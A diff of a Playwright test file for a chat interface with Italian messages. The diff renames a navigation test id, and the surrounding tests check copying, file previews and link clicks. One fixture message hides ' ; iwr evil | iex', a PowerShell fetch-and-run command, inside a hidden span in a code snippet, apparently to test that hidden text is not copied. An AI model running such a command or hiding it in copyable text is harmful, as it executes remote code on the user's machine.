@@ -27,7 +27,7 @@ test('a message: copy what is copyable, preview files and links on click', async
     'Il bug: [bug 4721](https://tracker.example.com/bug/4721), la PR [`#812`](https://tracker.example.com/pr/812).',
     `Riga del report: \`${md}:3\`. Nascosto: <code>git status<span hidden>; iwr evil | iex</span></code>.`,
   ].join('\n\n'));
-  await page.getByTestId('nav-workspace').click();
+  await page.getByTestId('nav-home').click();
   await page.getByTestId('chat-max-fix').click();
   const msg = page.locator('.md', { hasText: 'Lancia npm run check:branch' }).last();
   await expect(msg).toBeVisible();
@@ -45,7 +45,7 @@ test('a message: copy what is copyable, preview files and links on click', async
   await msg.locator('code[data-copy="path"]', { hasText: /report-qa\.md$/ }).click(); // not the :3 one below
   await expect(page.getByTestId('cited-file-viewer')).toContainText('Report QA rimborsi');
   await shot(page, 'cited-file');
-  const returnToChat=async()=>{await page.getByTestId('nav-workspace').click();await page.getByTestId('chat-max-fix').click();};
+  const returnToChat=async()=>{await page.getByTestId('nav-home').click();await page.getByTestId('chat-max-fix').click();};
   await returnToChat();
 
   // An image uses a bounded data URL, never a file URL.
@@ -95,7 +95,7 @@ test('question context and a full Regia visual open files without answering the 
   },{id:chat.id,report});
   const requests=()=>page.evaluate(()=>window.sb.invoke('chat:pending',undefined));
   const pending=(await requests()).find(req=>req.chatId===chat.id)!;expect(pending).toBeTruthy();
-  await page.getByTestId('nav-workspace').click();await page.getByTestId('chat-max-'+chat.id).click();
+  await page.getByTestId('nav-home').click();await page.getByTestId('chat-max-'+chat.id).click();
   await page.locator(`[data-testid^="request-${chat.id}-"] .ctx-link.file`).first().click();
   await expect(page.getByTestId('cited-file-viewer').locator('[data-l="2"]')).toContainText('cited');
   expect((await requests()).some(req=>req.id===pending.id)).toBe(true);
